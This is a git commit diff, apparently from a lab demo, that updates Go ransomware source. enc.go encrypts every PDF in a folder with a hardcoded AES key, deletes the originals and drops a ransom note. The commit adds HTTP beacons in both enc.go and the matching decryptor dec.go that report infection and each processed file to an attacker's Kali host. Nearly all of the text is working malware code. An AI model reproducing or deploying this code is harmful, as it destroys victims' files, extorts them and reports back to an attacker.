3b1d19ef5858c4722b6ed20e84a297856f052446
Jakov Čulo <jculo@vub.hr>
2026-05-18 23:38:02 +0200

    posalji poruke na kali

--- dec.go
+++ dec.go
@@ -4,39 +4,47 @@ import (
     "crypto/aes"
     "crypto/cipher"
     "fmt"
+    "net/http"
+    "net/url"
     "os"
     "path/filepath"
     "strings"
 )
 
 const aes_key = "12345678123456781234567812345678"
+const kali_ip = "192.168.72.128" 
+
+// Ista funkcija za logovanje
+func sendLog(message string) {
+    encodedMsg := url.QueryEscape(message)
+    url := fmt.Sprintf("http://%s:8080/log?msg=%s", kali_ip, encodedMsg)
+    go http.Get(url)
+}
 
 func main() {
     path := "pdfs"
     
+    sendLog("Žrtva pokrenula DEKRIPTOR! Fajlovi se vraćaju...")
+
     err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
         if err != nil {
-            fmt.Println("Error accesing path: ", path, err)
             return err
         }
         
-        // Brišemo ransom note prilikom dekripcije
         if !info.IsDir() && info.Name() == "RANSOM_NOTE.txt" {
             os.Remove(path)
-            fmt.Println("Ransom poruka obrisana.")
+            sendLog("Ransom poruka obrisana.")
             return nil
         }
 
         if !info.IsDir() && strings.HasSuffix(info.Name(), ".enc") {
             data, err := os.ReadFile(path)
             if err != nil {
-                fmt.Println("Error reading file: ", path, err)
                 return err
             }
             newFileName := strings.TrimSuffix(path, ".enc")
             file, err := os.Create(newFileName)
             if err != nil {
-                fmt.Println(err)
                 return err
             }
             defer file.Close()
@@ -45,34 +53,33 @@ func main() {
             aes_key_cipher, _ := aes.NewCipher(aes_key_byted)
             gcm, err := cipher.NewGCM(aes_key_cipher)
             if err != nil {
-                fmt.Println("Greska pri GCM")
                 return err
             }
             nonce, ciphertext := data[:gcm.NonceSize()], data[gcm.NonceSize():]
             plainText, err := gcm.Open(nil, nonce, ciphertext, nil)
             if err != nil {
-                fmt.Println("Greska pri dekripciji fajla: ", path)
+                sendLog(fmt.Sprintf("Greska pri dekripciji fajla: %s", path))
                 return err
             }
 
             _, err = file.Write(plainText)
             if err != nil {
-                fmt.Println("Greska pri pisanju")
                 return err
             }
             err = os.Remove(path)
             if err != nil {
-                fmt.Println("Greska pri brisanju .enc fajla")
                 return err
             }
-            fmt.Printf("Dekriptovan: %s\n", newFileName)
+            
+            // ŠALJEMO KA KALIJU:
+            sendLog(fmt.Sprintf("Dekriptiran: %s", newFileName))
         }
         return err
     })
 
     if err != nil {
-        fmt.Println("Error walking through the files/folders", err)
+        sendLog("Greška prilikom dekripcije.")
         return
     }
-    fmt.Println("Dekripcija zavrsena. Fajlovi povraceni.")
+    sendLog("Dekripcija zavrsena. Fajlovi vraceni.")
 }
--- enc.go
+++ enc.go
@@ -7,68 +7,67 @@ import (
     "fmt"
     "io"
     "net/http"
+    "net/url"
     "os"
     "path/filepath"
     "strings"
 )
 
 const aes_key = "12345678123456781234567812345678"
-const kali_ip = "10.0.2.15" // OVDJE STAVITE IP ADRESU VASEG KALIJA
+const kali_ip = "192.168.72.128" 
 
-// Funkcija za obavještavanje napadača (Kali Linux)
-func notifyAttacker(victimIP string) {
-    url := fmt.Sprintf("http://%s:8080/infected?ip=%s", kali_ip, victimIP)
-    // Šaljemo zahtjev u pozadini, ne blokiramo rad programa
+// Nova funkcija za slanje logova napadaču
+func sendLog(message string) {
+    // Kodujemo poruku da bi bila validna u URL adresi (razmaci itd.)
+    encodedMsg := url.QueryEscape(message)
+    url := fmt.Sprintf("http://%s:8080/log?msg=%s", kali_ip, encodedMsg)
+    // Šaljemo u pozadini, da ne usporava enkripciju
     go http.Get(url)
 }
 
-// Funkcija za kreiranje ransom poruke
 func dropRansomNote(dirPath string) {
     noteContent := `
 =============================================
-VASI FAJLOVI SU ENKRIPTOVANI!
+VASI FAJLOVI SU ENKRIPTIRANI!
 Svi vasi PDF dokumenti su sada nečitljivi.
 
 Da biste povratili pristup, morate platiti otkupninu.
 Kontaktirajte nas na: zli.haker@darkweb.onion
-
-Ukoliko ne platite u roku od 48h, vaši podaci
-će biti trajno izgubljeni.
 =============================================
 `
     notePath := filepath.Join(dirPath, "RANSOM_NOTE.txt")
     err := os.WriteFile(notePath, []byte(noteContent), 0644)
     if err != nil {
-        fmt.Println("Greska pri kreiranju ransom poruke: ", err)
+        sendLog("Greska pri kreiranju ransom poruke!")
     } else {
-        fmt.Println("Ransom poruka uspjesno kreirana.")
+        sendLog("Ransom poruka uspjesno kreirana.")
     }
 }
 
 func main() {
     path := "pdfs"
-    victimIP := "192.168.1.50" // Možete hardkodirati neku IP adresu žrtve radi demoa
-
-    // Obavještavamo Kali da je napad počeo
-    notifyAttacker(victimIP)
+    
+    // Javljamo serveru da je zaraza počela
+    http.Get(fmt.Sprintf("http://%s:8080/infected", kali_ip))
+    sendLog("Ransomware pokrenut na žrtvinom računaru!")
 
     encryptionCount := 0
 
     err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
         if err != nil {
-            fmt.Println("Error accesing path: ", path, err)
+            sendLog(fmt.Sprintf("Error accesing path: %s", path))
             return err
         }
         if !info.IsDir() && strings.HasSuffix(info.Name(), ".pdf") {
             data, err := os.ReadFile(path)
             if err != nil {
-                fmt.Println("Error reading file: ", path, err)
+                sendLog(fmt.Sprintf("Error reading file: %s", path))
                 return err
             }
 
             file, err := os.Create(path + ".enc")
             if err != nil {
-                fmt.Println(err)
+                sendLog(fmt.Sprintf("Greska pri kreiranju .enc: %s", path))
                 return err
             }
             defer file.Close()
@@ -77,7 +76,6 @@ func main() {
             aes_key_cipher, _ := aes.NewCipher(aes_key_byted)
             gcm, err := cipher.NewGCM(aes_key_cipher)
             if err != nil {
-                fmt.Println("Greska pri GCM")
                 return err
             }
             nonce := make([]byte, gcm.NonceSize())
@@ -86,32 +84,30 @@ func main() {
             encrypted_data := gcm.Seal(nonce, nonce, data, nil)
             _, err = file.Write(encrypted_data)
             if err != nil {
-                fmt.Println("Greska pri pisanju")
                 return err
             }
             err = os.Remove(path)
             if err != nil {
-                fmt.Println("Greska pri brisanju originala")
                 return err
             }
             
             encryptionCount++
-            fmt.Printf("Enkriptovan: %s\n", info.Name())
+            // UMJESTO fmt.Println, ŠALJEMO KA KALIJU:
+            sendLog(fmt.Sprintf("Enkriptiran: %s", info.Name()))
         }
 
         return err
     })
 
     if err != nil {
-        fmt.Println("Error walking through the files/folders", err)
+        sendLog("Greška prilikom šetnje kroz foldere.")
         return
     }
 
-    // Nakon što prođe kroz sve fajlove, ostavi poruku u folderu 'pdfs'
     if encryptionCount > 0 {
         dropRansomNote("pdfs")
-        fmt.Println("Enkripcija zavrsena. Sistemi zarazeni.")
+        sendLog("Enkripcija zavrsena. Sistemi zarazeni.")
     } else {
-        fmt.Println("Nije pronadjen nijedan PDF za enkripciju.")
+        sendLog("Nije pronadjen nijedan PDF za enkripciju.")
     }
 }
